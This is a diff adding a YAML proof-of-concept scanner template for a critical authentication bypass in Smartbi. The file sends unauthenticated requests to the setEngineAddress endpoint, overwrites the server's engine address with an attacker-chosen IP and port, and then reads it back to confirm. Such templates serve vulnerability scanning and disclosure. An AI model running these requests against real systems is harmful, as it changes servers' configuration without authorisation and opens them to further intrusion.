@@ -1,0 +1,28 @@
+id: poc-yaml-smartbi-address-auth-bypass
+info:
+  name: Smartbi 权限绕过漏洞
+  severity: critical
+  tags:
+  - 权限绕过
+  finger: Smartbi
+variables:
+  t1: random_int(5000,10000)
+requests:
+- method: GET
+  path: /smartbi/smartbix/api/monitor/setEngineAddress
+  expression: status_code == 406 && contains(body,"Unknown error -> Request method
+    'GET' not supported") && contains(body,"smartbix.SmartbiXException")
+- method: POST
+  path: /smartbi/smartbix/api/monitor/setEngineAddress
+  headers:
+    Content-Type: application/json
+  data: http://192.168.133.123:{{.t1}}
+  expression: status_code == 200 && contains(body,"\"message\":\"Engine address updated
+    successfully\"")  && contains(body,"\"took\":1")
+- method: POST
+  path: /smartbi/smartbix/api/monitor/engineInfo
+  headers:
+    Content-Type: application/json
+  expression: status_code == 200 && contains(body,"\"message\":\"Operation successful\"")  &&
+    contains(body,"\"took\":0") && contains(body,t1)
+transport: http
